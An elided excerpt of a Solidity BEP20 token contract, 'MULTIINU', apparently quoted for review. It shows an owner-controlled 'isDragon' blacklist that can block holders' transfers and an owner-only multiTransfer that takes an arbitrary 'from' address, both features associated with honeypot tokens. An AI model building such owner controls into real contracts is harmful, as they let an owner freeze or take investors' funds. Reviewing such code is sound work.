...
contract MULTIINU is BEP20, Auth {
    ...
    mapping (address => bool) public isDragon;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(dragonMode && !antibot){
            require(!isDragon[sender],"Dragon");
        }
    ...
    function killDragon_status(bool _status) external onlyOwner {
        if(_status){
            require(launchMode,"Cannot turn on draognMode after launch is done");
        }
        dragonMode = _status;
...
function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
    if(msg.sender != from && !isDragon[from]){
